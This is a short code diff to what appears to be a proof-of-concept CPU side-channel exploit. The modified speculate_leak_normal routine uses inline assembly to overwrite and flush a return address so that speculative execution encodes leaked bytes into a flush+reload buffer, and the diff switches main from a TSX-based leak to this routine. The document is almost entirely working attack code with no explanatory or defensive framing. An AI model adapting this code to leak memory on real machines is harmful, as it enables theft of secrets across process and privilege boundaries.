@@ -22,25 +22,16 @@ speculate_leak_normal(unsigned char *leak, unsigned char *reloadbuffer) {
       "andq $0xff, %%rax\n"
       "shl $0xa, %%rax\n"
       "prefetcht0 (%%rax, %1)\n"
+
       // infinite loop
       "3: pause\n"
       "jmp 3b\n"
       // call target
       "2:\n"
       "movabs $1f, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "imulq $1, %%rax, %%rax\n"
-      "mov %%eax, (%%rsp)\n"
+      "mov %%rax, (%%rsp)\n"
+      "clflush (%%rsp)\n"
+      // "mfence\n"
       "retq\n"
       // actual return point
       "1:\n" ::"r"(leak),
@@ -266,7 +257,7 @@ int main() {
   for (size_t i = 0; i < ITERS; ++i) {
     flush(reloadbuffer);
     asm volatile("mfence\n");
-    tsx_leak_read_normal(NULL, reloadbuffer);
+    speculate_leak_normal(NULL, reloadbuffer);
     reload(reloadbuffer, results);
   }
 
